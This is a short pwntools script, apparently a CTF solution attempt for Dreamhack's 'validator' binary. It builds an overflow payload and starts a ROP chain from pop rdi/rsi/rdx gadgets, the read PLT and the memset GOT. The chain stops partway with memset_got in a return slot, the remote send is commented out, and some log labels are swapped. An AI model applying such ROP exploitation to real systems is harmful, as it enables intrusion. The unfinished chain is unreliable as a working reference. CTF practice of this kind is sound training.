from pwn import *

# port = 14494
# rem = remote("host3.dreamhack.games", port)

elf = ELF("./validator/problem/validator_dist")
rop = ROP("./validator/problem/validator_dist")

def slog(name, addr): return success(': '.join([name, hex(addr)]))

payload = b'DREAMHACK!'
for i in range(119, 1, -1):
  payload += chr(i).encode()
payload += b'A' * 8

pop_rdi = rop.find_gadget(['pop rdi'])[0]
pop_rsi = rop.find_gadget(['pop rsi'])[0]
pop_rdx = rop.find_gadget(['pop rdx'])[0]

slog("rdi", pop_rdi)
slog("rsi", pop_rsi)
slog("rdx", pop_rdx)

read_plt = elf.plt['read']
memset_got = elf.got['memset']

slog("read got", read_plt)
slog("memset plt", memset_got)

payload += p64(pop_rdi)
payload += p64(0)
payload += p64(memset_got)



# rem.sendline(payload)

# rem.interactive()